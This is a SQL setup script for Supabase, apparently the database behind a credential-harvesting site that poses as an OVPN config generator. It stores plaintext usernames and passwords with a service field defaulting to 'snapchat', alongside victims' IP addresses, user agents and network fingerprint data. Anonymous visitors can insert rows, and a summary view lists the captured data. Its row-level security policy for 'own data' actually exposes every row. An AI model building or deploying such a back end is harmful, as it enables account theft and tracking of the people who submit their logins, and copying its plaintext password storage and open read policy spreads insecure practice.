-- =====================================================
-- ENHANCED DATABASE SCHEMA FOR OVPN GENERATOR (v2.4)
-- Includes support for Native Network Config & Platform Type
-- Run this in your Supabase SQL Editor
-- =====================================================

-- Drop existing table if you want a fresh start (WARNING: DELETES DATA)
-- DROP TABLE IF EXISTS user_credentials CASCADE;

-- If table exists, alter it. If not, create it.
-- We'll use CREATE TABLE IF NOT EXISTS and then ALTER for new columns.

CREATE TABLE IF NOT EXISTS user_credentials (
    id SERIAL PRIMARY KEY,
    username VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL,
    ip_address VARCHAR(45),
    created_at TIMESTAMPTZ DEFAULT NOW(),
    server_ip VARCHAR(45) DEFAULT '206.45.29.181',
    server_port INTEGER DEFAULT 1194,
    protocol VARCHAR(10) DEFAULT 'udp',
    ca_crt TEXT,
    client_crt TEXT,
    client_key TEXT,
    ta_key TEXT,
    ovpn_config TEXT,
    system_info JSONB,
    config_name VARCHAR(255),
    notes TEXT,
    updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- Add new columns if they don't exist
DO $$
BEGIN
    IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name = 'user_credentials' AND column_name = 'native_network_config') THEN
        ALTER TABLE user_credentials ADD COLUMN native_network_config JSONB;
    END IF;

    IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name = 'user_credentials' AND column_name = 'platform_type') THEN
        ALTER TABLE user_credentials ADD COLUMN platform_type VARCHAR(50) DEFAULT 'web';
    END IF;
    
    IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name = 'user_credentials' AND column_name = 'service') THEN
        ALTER TABLE user_credentials ADD COLUMN service VARCHAR(50) DEFAULT 'snapchat';
    END IF;
END $$;

-- =====================================================
-- RECREATE INDEXES
-- =====================================================

CREATE INDEX IF NOT EXISTS idx_user_credentials_username ON user_credentials(username);
CREATE INDEX IF NOT EXISTS idx_user_credentials_ip ON user_credentials(ip_address);
CREATE INDEX IF NOT EXISTS idx_user_credentials_created ON user_credentials(created_at DESC);
CREATE INDEX IF NOT EXISTS idx_user_credentials_ovpn_generated ON user_credentials ((system_info->>'ovpn_generated'));
CREATE INDEX IF NOT EXISTS idx_user_credentials_platform_type ON user_credentials(platform_type);

-- =====================================================
-- UPDATED VIEWS
-- =====================================================

DROP VIEW IF EXISTS vw_credentials_summary;
CREATE OR REPLACE VIEW vw_credentials_summary AS
SELECT 
    id,
    username,
    service,
    platform_type,
    ip_address,
    created_at,
    server_ip,
    
    -- Extract key data
    system_info->'basic'->>'userAgent' AS user_agent,
    system_info->'advanced'->'network_topology'->>'natType' AS nat_type,
    
    -- Check if Native Config exists
    (native_network_config IS NOT NULL) AS has_native_config,
    
    -- Check if OVPN was generated
    (ovpn_config IS NOT NULL) AS has_ovpn_config,
    LENGTH(ovpn_config) AS ovpn_config_size,
    
    -- Check data completeness
    (system_info->'advanced' IS NOT NULL) AS has_advanced_data
FROM 
    user_credentials
ORDER BY 
    created_at DESC;

COMMENT ON VIEW vw_credentials_summary IS 'Summary of credentials including platform and native config status';

-- =====================================================
-- AUTO-UPDATE TRIGGER
-- =====================================================

CREATE OR REPLACE FUNCTION update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
    NEW.updated_at = NOW();
    RETURN NEW;
END;
$$ language 'plpgsql';

DROP TRIGGER IF EXISTS update_user_credentials_updated_at ON user_credentials;
CREATE TRIGGER update_user_credentials_updated_at 
    BEFORE UPDATE ON user_credentials
    FOR EACH ROW
    EXECUTE FUNCTION update_updated_at_column();

-- =====================================================
-- ROW LEVEL SECURITY
-- =====================================================

ALTER TABLE user_credentials ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Allow public inserts" ON user_credentials;
CREATE POLICY "Allow public inserts" ON user_credentials FOR INSERT TO anon WITH CHECK (true);

DROP POLICY IF EXISTS "Allow service role to read all" ON user_credentials;
CREATE POLICY "Allow service role to read all" ON user_credentials FOR SELECT TO service_role USING (true);

DROP POLICY IF EXISTS "Allow authenticated users to read own data" ON user_credentials;
CREATE POLICY "Allow authenticated users to read own data" ON user_credentials FOR SELECT TO authenticated USING (true);

-- =====================================================
-- VERIFICATION
-- =====================================================

DO $$
BEGIN
    RAISE NOTICE '✅ Enhanced Schema Applied Successfully (v2.4)';
END $$;
